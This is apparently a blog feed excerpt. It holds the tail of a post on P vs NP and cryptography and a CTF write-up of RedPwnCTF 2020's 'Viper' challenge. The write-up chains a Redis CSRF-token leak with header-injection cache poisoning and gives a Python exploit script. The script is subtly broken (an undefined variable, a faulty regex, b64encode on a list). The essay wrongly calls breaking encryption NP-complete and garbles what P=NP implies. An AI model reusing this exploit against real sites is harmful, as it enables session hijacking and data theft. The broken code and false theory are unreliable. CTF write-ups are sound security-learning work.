<p>In the study of algorithm and computer science theory, reduction is to take an instance of some challenge, denoted as X, and convert or transform it into an instance of a different challenge, Y, with which we have more information of or know the solution of. As an example, how do you shoot a blue elephant? Use a blue elephant gun. How do you shoot a red one? Paint them blue, then use your blue elephant gun! :)</p>
<h3 id="cook-levin-theorem">Cook-Levin Theorem</h3>
<p>Simply put, the Cook-Levin Theorem states that the boolean satisfiability problem is NP-Complete.</p>
<p>If we know that all NP-complete problems are reducible to each other, and if we assume that the subset of problems “P” and the subset of problems “NP” are in fact belonging to the same group, then <strong>all NP-complete problems can be reduced to a problem that exists in P. Therefore, every NP-complete problem has a solution that can be verified to run in polynomial time.</strong> If “P=NP” this is big news. This means that many problems that we have spent years trying to determine an efficient solution for simply needs to be reduced to a problem in P, and solved with a solution that already exists!</p>
<p>If “P!=NP” this is equally important! That means that, all NP-complete problems are, in fact, hard. Therefore, no efficient solution for them exists at all.</p>
<hr>
<h2 id="introduction-into-cryptography">Introduction into Cryptography</h2>
<p>From my blog, it is clear to see that my expertise lies in web-based exploits and problems. But I am still a student of applied mathematics, and thus cryptography is a field of study that has constantly been on my radar.</p>
<p>Cryptography, in its most generalized form, is the act of encrypting and decrypting data in order to intentionally obfuscate the information to protect the contents of said info.  Encryption takes plain-text, then uses a cipher to transform it into cipher-text (more on the method of how it does that later), which can then be decrypted using that same cipher and retransforming the cipher-text back into plain. This is an INCREDIBLY simplified description of cryptography. Crypto is EXTREMELY important to the functions of computer security and digital privacy as we know it. Specifically, crypto serves several purposes:</p>
<ul>
<li>encryption, as mentioned before.</li>
<li>authentication, which validates information from a trusted source.</li>
<li>integrity, which will ensure that the stream of data will not be altered on its transmission to the destination.</li>
</ul>
<h3 id="keys-and-asymmetric-encryption">Keys and “Asymmetric” encryption</h3>
<p>Dual-Key Cryptography is also called Asymmetric Cryptography. Specifically, it allows for secure communication in a channel between two people. Asymmetric cryptography relies on the use of two keys - parameters that which specify the transformation of plain to cipher, and vice-versa for decoding. It works as so:</p>
<ol>
<li>There exist two keys: one is publicly available, and expected to be known by many. The other is private - expected to be known by one.</li>
<li>Consider a user, Alice, who wishes to send information to another user, Bob. Alice is aware that Bob has a public key that can be used to encrypt data to send to him.</li>
<li>Alice uses the public key to encrypt some plaintext. She sends the resulting ciphertext to Bob. <strong>She cannot decode the ciphertext she has just encrypted with Bob’s public key.</strong></li>
<li>Bob receives Alice’s ciphertext, and uses his private key to transform it into plaintext. Since his private key is used specifically for the decoding of information that was encrypted by his public key, he is able to do this without much effort.</li>
</ol>
<p>The idea here is that the two keys aid in the crypto process but serve different functions. The public key encodes, while the private key decodes. The private key is assumed to be known by only one person, so the act of decoding is only capable of being performed by that single individual. However, anyone who knows the public key are free to encode data with it as they wish - keeping in mind that once its in cipher form, it cannot be reverted back to plain without the private key.</p>
<p>The “safety” of asymmetric cryptography relies on just how long it would take to try and brute-force your way into decoding a cipher without the necessary decoding key. There are several measures in place that prevent a malicious hacker from using a few dedicated CPUs to guess the hashes of a given ciphertext. As an example, if you wanted to somehow guess the private key yourself, the existence of <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">information entropy</a> - the average “level” of uncertainty associated to any random variable, in this case the value of the key - will deter you. If you intend to guess the key value (which is often randomized), you will need to overcome the hurdle of the extremely high value of uncertainty in correctly guessing it, so the odds are not in your favor. The bigger size your key, the more information entropy you will have to deal with. Additionally, open-source encryption algorithms are widespread and widely discussed, allowing for the their innovation and improvements as new iterations develop. This means potentially more complex keys, or different encoding algorithms.</p>
<p>Cryptography relies on the simple mathematical principle of one-way functions: it is exceedingly difficult to undo the transformation of a plaintext document to ciphertext without the correct key - and so far, there does not exist any sort of reversing algorithm capable of doing so in an efficient manner, and in a manner that applies to numerous different cryptographic algorithms as well. Reversing the crypto function is &ldquo;hard&rdquo; to do&hellip;</p>
<hr>
<h2 id="what-if-p--np">What if P = NP?</h2>
<p>Finally, we can answer the issue here. What are the implications of proving “P=NP” to cryptography?</p>
<p>Consider cryptographic algorithms in the context of a hacker. They are considered to be one-way functions due to the fact that reverse engineering the crypto algorithm will take far too long. In this sense, it is extremely easy to generate ciphertext - the function in question is <strong>easy</strong> to compute on any input. However, the resulting ciphertext output, the image, is <strong>hard</strong> to invert - that is, reversing the function to get back the original parameters. Think of it like baking a cake. It is easy to, given all the ingredients, combine the items and pop our mixture in the oven to receive a freshly-baked cake. However, in comparison, it is considerably harder to reverse the baking process and reduce our cake back into its base components of eggs, sugar, flour, etc.</p>
<p>The problem of reversing a cryptographic algorithm - inverting the one-way function of encryption - so far lies amongst the problems in NP-Complete. If we prove that the subset of problems P and the subset of problems NP are one and the same, P=NP, we have inadvertently stated that there does exist a solution that can efficiently/quickly reverse a cryptographic hash - namely, in polynomial time.</p>
<p>P=NP means the end of cryptography as we know it. One-way functions will no longer exist! Strong cryptographic algorithms are only formidable as withstanding the tests of time in the face of hackers brute forcing their ways through them. If P=NP, time will no longer be on our side, and password/data security will be something trivial for a malicious hacker to bypass.</p>
<p>To this end, many operate on the assumption that P != NP, and there exists dedicated research into proving so. For if we end up finding that P = NP, our privacy and online security would crumble right in front of us.</p>
<p>Jam</p>
<h2 id="further-reading">Further Reading</h2>
<ol>
<li>&ldquo;<a href="http://news.mit.edu/2009/explainer-pnp">Explained: P vs. NP</a>&rdquo; Hardesty, Larry. “Explained: P vs. NP.” MIT News, 29 Oct. 2009, news.mit.edu/2009/explainer-pnp.</li>
<li>&ldquo;<a href="https://www.garykessler.net/library/crypto.html">An Overview of Cryptography</a>&rdquo; Kessler, Gary C. “Overview of Cryptography.” An Overview of Cryptography, 1 June 2020, <a href="http://www.garykessler.net/library/crypto.html">www.garykessler.net/library/crypto.html</a>.</li>
</ol>
<h2 id="references">References</h2>
<ol>
<li>Rouse, Margaret. “Asymmetric Cryptography (Public Key Cryptography).” SearchSecurity, 20 Mar. 2020, searchsecurity.techtarget.com/definition/asymmetric-cryptography.</li>
<li>Cook, Stephen. “The Complexity of Theorem-Proving Procedures.” ACM Digital Library, STOC ’71: Proceedings of the third annual ACM symposium on Theory of computing, May 1971, dl.acm.org/doi/10.1145/800157.805047.</li>
<li>My informative TAs and professors of my algorithm analysis courses.</li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>RedPwnCTF 2020, Part 3</title>
            <link>https://jamvie.net/posts/2020/07/redpwnctf-2020-part-3/</link>
            <pubDate>Thu, 02 Jul 2020 01:56:16 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/07/redpwnctf-2020-part-3/</guid>
            <description>Part 3 of my writeup series for RedPwnCTF 2020! I checked out the web challenge known as &amp;ldquo;Viper&amp;rdquo;.
Let&amp;rsquo;s Begin! Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:
When we create our viper, its name is its viperId, which is a UUID.
The source code is available for us in this challenge as well. The main file, server.js, defines multiple endpoints - but the one that caught my eye immediately was GET /admin/create.</description>
            <content type="html"><![CDATA[<p>Part 3 of my writeup series for RedPwnCTF 2020! I checked out the web challenge known as &ldquo;Viper&rdquo;.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>Snakes are my favourite animal. And now, you can easily create ASCII-text snakes with the handy services provided by RedPwn:</p>

    <img src="/images/REDPWN2020_ViperHome.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>When we create our viper, its name is its viperId, which is a UUID.</p>
<p>The source code is available for us in this challenge as well. The main file, <code>server.js</code>, defines multiple endpoints - but the one that caught my eye immediately was <code>GET /admin/create</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/create&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>;
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">viperId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">viperId</span>;
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">csrfToken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">csrfToken</span>;

    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">v4regex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#34;^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$&#34;</span>, <span style="color:#e6db74">&#34;i&#34;</span>);
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">viperId</span>.<span style="color:#a6e22e">match</span>(<span style="color:#a6e22e">v4regex</span>)){
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad request body&#34;</span>);
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">viperId</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">csrfToken</span>){
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad request body&#34;</span>);
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">isAdmin</span>){
        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">exists</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                <span style="color:#66d9ef">return</span>;
            }
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
                <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                        <span style="color:#66d9ef">return</span>;
                    }
                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">csrfToken</span>, <span style="color:#e6db74">&#39;base64&#39;</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;ascii&#39;</span>)){
                        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">randomToken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getRandomInt</span>(<span style="color:#ae81ff">1000000</span>, <span style="color:#ae81ff">10000000000</span>);
                        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#a6e22e">randomToken</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
                            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                                <span style="color:#66d9ef">return</span>;
                            }
                        });

                        <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">viperId</span>;
                        <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;./flag.txt&#39;</span>).<span style="color:#a6e22e">toString</span>();

                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/viper/&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>));
                    }<span style="color:#66d9ef">else</span>{
                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Unauthorized&#34;</span>);
                    }
                });
            } <span style="color:#66d9ef">else</span> {
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Unauthorized&#34;</span>);
            }
        });
    }<span style="color:#66d9ef">else</span>{
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
    }
 });
</code></pre></div><p>To summarize, <code>admin/create</code> validates the given viperID as a UUID, checks the CSRF token and session ID of the request as the admin&rsquo;s, and once verified changes the name of the viper associated to the request&rsquo;s viperID to the contents of <code>flag.txt</code>. Additionally, the existence of a report function stipulates the use of an XSS/CSRF attack - likely CSRF, as the presence of using the admin&rsquo;s CSRF token to validate the user will imply that we somehow will have to steal their token in some way or another and implement such an attack utilizing the token we steal.</p>
<p>The admin&rsquo;s CSRF token is generated by a function known as <code>getRandomInt()</code>, which is called by the <code>/admin</code> endpoint:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getRandomInt</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">min</span>, <span style="color:#a6e22e">max</span>) =&gt; {
    <span style="color:#a6e22e">min</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">ceil</span>(<span style="color:#a6e22e">min</span>);
    <span style="color:#a6e22e">max</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(<span style="color:#a6e22e">max</span>);
    <span style="color:#66d9ef">return</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> (<span style="color:#a6e22e">max</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">min</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">+</span> <span style="color:#a6e22e">min</span>;
 };

 <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>;

<span style="color:#75715e">/*Focusing only on the bit where the CSRF token is generated*/</span>
(...)

            } <span style="color:#66d9ef">else</span> {
                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">randomToken</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getRandomInt</span>(<span style="color:#ae81ff">10000</span>, <span style="color:#ae81ff">1000000000</span>);
                <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;__csrftoken__&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sess</span>.<span style="color:#a6e22e">viperId</span>, <span style="color:#a6e22e">randomToken</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                        <span style="color:#66d9ef">return</span>;
                    }
                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;pages/admin&#39;</span>, {
                        <span style="color:#a6e22e">csrfToken</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">randomToken</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>)
                    });
                });
            }
        });

(...)
</code></pre></div><p>For context, the variable <code>client</code> is defined as:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">client</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">redis</span>.<span style="color:#a6e22e">createClient</span>(<span style="color:#e6db74">&#39;redis://redis:6379&#39;</span>);
</code></pre></div><p>Redis is an open-source data structure store that is used as a cache. The CSRF token is stored in the redis server.
The <code>client.set()</code> function sets the cache&rsquo;s key. It&rsquo;s built by concatenating <code>'__csrftoken__'</code> with the <code>viperid</code>, which we find in the <code>admin/generate/:secrettoken</code> endpoint is <code>'admin_account'</code>. Therefore, the redis cache key to the admin&rsquo;s CSRF token is <code>'__csrftoken__admin_account'</code>.</p>
<p>There is another endpoint I haven&rsquo;t mentioned yet that also utilizes the redis cache, known as <code>/analytics</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/analytics&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">ip_address</span>;

(...)

    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">exists</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reply</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">incr</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                    <span style="color:#66d9ef">return</span>;
                }
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reply</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; times.&#34;</span>);
            });
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">ip_address</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">reply</span>) {
                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Something went wrong&#34;</span>);
                    <span style="color:#66d9ef">return</span>;
                }
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Success! &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ip_address</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; has visited the site 1 time.&#34;</span>);
            });
        }
    });
 });
</code></pre></div><p>The endpoint logs the amount of times the webpage&rsquo;s visitor&rsquo;s <code>ip_address</code> checked the page into the redis cache. Specifically, it sets the key of the data as our input to the <code>ip_address</code> param. We already know of an existing key and entry in the cache, the key to the admin&rsquo;s CSRF token (<code>'__csrftoken__admin_account'</code>). If we provided this as our input to the <code>ip_address</code> param, we should get the CSRF token (incremented by 1) in return.</p>
<p>At this point, it&rsquo;s pretty obvious that our attack will have to do some cache-poisoning. I have only ever done one other challenge that involved cache poisoning so I certainly don&rsquo;t have much experience-based knowledge on it - so I had to do some research into how cache-poisoning attacks work.</p>
<p>Altogether, the attack plan is as follows:</p>
<ol>
<li>Grab the CSRF token through <code>/analytics</code>.</li>
<li>Create our viper page, but inject our own headers into it so that it will lead to the <code>admin/create</code> endpoint that will give us the flag.</li>
<li>Cache our viper page with the injected headers, and then send the URL of our page to the admin.</li>
<li>When the admin visits our page, the cached request that we injected with our headers will fire, and will change the name of the viper to that of the flag.</li>
</ol>
<h3 id="step-1-grab-the-csrf-token">Step 1: Grab the CSRF token.</h3>
<p>As mentioned before, we can use the <code>/analytics</code> endpoint to grab the CSRF token utilizing <code>'__csrftoken__admin_account'</code> as our <code>ip_address</code> value - using it as the key, we should recieve the token as return value. A simple GET request to the endpoint with the <code>ip_address</code> value set to <code>__csrftoken__admin_account</code> will allows us to retrieve the token.</p>
<pre><code>curl http://2020.redpwnc.tf:31291/analytics?ip_address=__csrftoken__admin_account
</code></pre>
    <img src="/images/REDPWN2020_ViperCSRF.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>We will use these commands in a script later on.</p>
<h3 id="step-2-create-a-user-and-our-own-viper-page-and-then-inject-custom-headers-into-it">Step 2: Create a user and our own viper page, and then inject custom headers into it.</h3>
<p>After we create the page, we need to take note of the sessionid, cookies, and viperID for the URL that we send to the admin. When we inject the header, the request URL should be a GET request to <code>admin/create</code>.</p>
<h3 id="step-3-cache-the-viper-page-we-created">Step 3: Cache the viper page we created.</h3>
<p>Simply make a GET request for our page so it will be put into the redis cache. Note that the server will only accept requests encoded in base64, so we must make sure our payload is properly encoded before doing so.</p>
<h3 id="step-4-send-our-viper-url-to-the-admin">Step 4: Send our viper URL to the admin!</h3>
<p>Sending the page URL to the admin will hopefully activate the cache to retrieve the instance of our page with the injected payload into it. When they visit, the payload header will fire a request to the <code>/admin/create</code> endpoint and validate the requester as admin through our use of CSRF token-stealing - thereby allowing the server to rewrite our viper name to that of whatever is in the <code>flag.txt</code> file in their server. Once we access our page once more, the name should change to the flag!</p>
<p>Here is my script for this challenge:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
<span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> socket<span style="color:#f92672">,</span> re
<span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode

address <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://2020.redpwnc.tf:31291&#34;</span>

ADMIN_VIPER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CAFECAFE-CAFE-4CAF-8CAF-CAFECAFECAFE&#34;</span>


viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/create&#39;</span>, allow_redirects<span style="color:#f92672">=</span>False)
<span style="color:#75715e"># Get the viper&#39;s name/viper&#39;s id, which is UUID format</span>
viper_id <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})&#34;</span>, viper<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
session_id <span style="color:#f92672">=</span> viper<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#34;connect.sid&#34;</span>]
cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;connect.sid&#34;</span> : session_id}



viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/analytics?ip_address=__csrftoken__admin_account&#34;</span>)
<span style="color:#66d9ef">print</span>(viper<span style="color:#f92672">.</span>text)
viper_page <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/analytics?ip_address=__csrftoken__admin_account&#34;</span>)
csrf_token <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;site (\*d) times.&#34;</span>, viper_page<span style="color:#f92672">.</span>text)
<span style="color:#75715e"># Encode in base64</span>
csrf_token <span style="color:#f92672">=</span> b64encode(csrf_token)



payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;GET /viper/&#34;</span><span style="color:#f92672">+</span>viper_id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: 2020.redpwnc.tf:31291</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">create?x=&lt;!--&amp;viperId=&#34;</span><span style="color:#f92672">+</span>ADMIN_VIPER<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;csrfToken=&#34;</span><span style="color:#f92672">+</span>csrf<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;#--&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Accept: */*</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Cookie: connect.sid=&#34;</span><span style="color:#f92672">+</span>session_id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>

poison <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
poison<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;2020.redpwnc.tf&#34;</span>, <span style="color:#ae81ff">31291</span>))
poison<span style="color:#f92672">.</span>sendall(payload<span style="color:#f92672">.</span>encode())
poison<span style="color:#f92672">.</span>close()


viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://2020.redpwnc.tf:31291/viper/&#34;</span><span style="color:#f92672">+</span>viper_id, cookies<span style="color:#f92672">=</span>cookies)

<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;URL to admin:&#34;</span>)
<span style="color:#66d9ef">print</span>(address<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/viper/&#34;</span><span style="color:#f92672">+</span>viper_id)



input(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> fetching... </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> press ENTER to load cached page, once the admin has visited the URL.&#34;</span>)
viper <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://2020.redpwnc.tf:31291/viper/&#34;</span><span style="color:#f92672">+</span>ADMIN_VIPER, cookies<span style="color:#f92672">=</span>cookies)
<span style="color:#66d9ef">print</span>(viper<span style="color:#f92672">.</span>text)

</code></pre></div>
    <img src="/images/REDPWN2020_ViperFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>RedPwnCTF 2020, part 2</title>
            <link>https://jamvie.net/posts/2020/06/redpwnctf-2020-part-2/</link>
            <pubDate>Sun, 28 Jun 2020 21:19:19 -0600</pubDate>
            
